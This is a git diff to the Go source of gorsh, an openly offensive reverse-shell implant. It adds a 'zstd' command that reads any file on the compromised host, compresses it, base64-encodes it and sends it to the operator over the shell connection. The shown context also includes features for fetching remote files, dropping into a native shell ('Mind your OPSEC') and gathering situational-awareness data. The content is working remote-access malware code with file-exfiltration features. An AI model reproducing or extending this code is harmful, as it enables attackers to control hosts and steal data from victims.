@@ -19,6 +19,7 @@ import (
 	"github.com/audibleblink/gorsh/fetch"
 	"github.com/audibleblink/gorsh/shell"
 	"github.com/audibleblink/gorsh/sitrep"
+	"github.com/valyala/gozstd"
 )
 
 const (
@@ -32,6 +33,7 @@ var (
 	fingerPrint   string
 )
 
+// Base64 encoding function
 func Encode(path string) (string, error) {
 	buff, err := ioutil.ReadFile(path)
 	if err != nil {
@@ -40,12 +42,14 @@ func Encode(path string) (string, error) {
 	return base64.StdEncoding.EncodeToString(buff), err
 }
 
+// Helper method to send output to reverse shell handler
 func Send(conn net.Conn, msg string) {
 	conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
 	conn.Write([]byte("\n"))
 }
 
+// Directory listing
 func ListDir(argv []string) (string, error) {
 	var path string
 
@@ -75,6 +79,8 @@ func ListDir(argv []string) (string, error) {
 }
 
 // Takes a network connection as its arg so it can pass stdio to it
+// Handles user input and dispatches commands to various functions
+// TODO: Extract this and perhaps modularize to make adding functionality easier
 func InteractiveShell(conn net.Conn) {
 	var (
 		exit    bool           = false
@@ -174,6 +180,20 @@ func InteractiveShell(conn net.Conn) {
 				net := sitrep.All()
 				Send(conn, net)
 
+			case "zstd":
+				if len(argv) != 2 {
+					Send(conn, "Usage: zstd <file>")
+				} else {
+					buf, err := ioutil.ReadFile(argv[1])
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						compressed := gozstd.CompressLevel(nil, buf, 15)
+						data := base64.StdEncoding.EncodeToString(compressed)
+						Send(conn, data)
+					}
+				}
+
 			case "help":
 				Send(conn, "Currently implemented commands: \n"+
 					"cd [path]          -  Change the process' working directory\n"+
@@ -185,6 +205,7 @@ func InteractiveShell(conn net.Conn) {
 					"fetch <URI> <file> -  Fetch stuff. http[s]:// or //share/folder (Windows only)\n"+
 					"shell              -  Drops into a native shell. Mind your OPSEC\n"+
 					"sitrep             -  Situation Awareness information\n"+
+					"zstd <file>        -  Compress and base64 endode file and print\n"+
 					"\n")
 			default:
 				Send(conn, "Command not implemented. Try 'help'")
